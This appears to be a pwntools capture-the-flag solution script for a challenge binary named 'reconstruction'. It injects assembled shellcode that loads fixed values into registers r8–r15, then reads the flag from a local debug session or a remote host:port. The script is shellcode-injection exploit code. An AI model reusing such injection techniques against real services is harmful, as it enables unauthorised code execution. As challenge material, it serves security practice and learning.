#!/usr/bin/env python3



from pwn import *
import sys

context.arch = "amd64"

def exploit(io):
    io.sendlineafter(b": ", b"fix")
    shellcode = asm("""
                        mov r8, 0x1337c0de
                        mov r9, 0xdeadbeef
                        mov r10, 0xdead1337
                        mov r12, 0x1337cafe 
                        mov r13, 0xbeefc0de
                        mov r14, 0x13371337
                        mov r15, 0x1337dead
                        ret
    """)
    io.sendafter(b": ", shellcode)
    io.recvuntil(b"components: ")
    flag = io.recvline().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./reconstruction")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
